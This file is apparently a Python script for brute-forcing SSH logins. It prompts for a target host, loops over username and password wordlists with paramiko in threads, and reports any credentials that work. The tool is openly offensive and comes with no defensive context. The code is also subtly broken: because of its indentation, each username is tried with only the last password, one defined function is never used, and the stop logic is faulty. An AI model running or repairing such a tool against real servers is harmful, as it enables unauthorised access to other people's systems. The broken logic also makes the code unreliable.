import paramiko, sys, os, termcolor
import threading, time

stop_flag = 0

def ssh_connectu(username):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username,)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Username: ' + username), 'green'))

    except:
        print(termcolor.colored(('[-] Incorrect Username: ' + username), 'red'))
    ssh.close()

def ssh_connect(username, password):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))

    except:
        print(termcolor.colored(('[-] Incorrect Password: ' + password + ', For Account: ' + username), 'red'))
    ssh.close()

host = input('[+] Target Address: ')
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"
print('\n')

if os.path.exists(passwords_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit(1)

print('* * * Starting Threaded SSH Bruteforce On ' + host + ' With Account: ' + usernames_file + '* * *') 

with open(usernames_file, 'r') as file:
    for username in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        username = username.strip()
        with open(passwords_file, 'r') as file:
            for password in file.readlines():
                password = password.strip()
            t = threading.Thread(target=ssh_connect, args=(username, password))
            t.start()
            time.sleep(0)


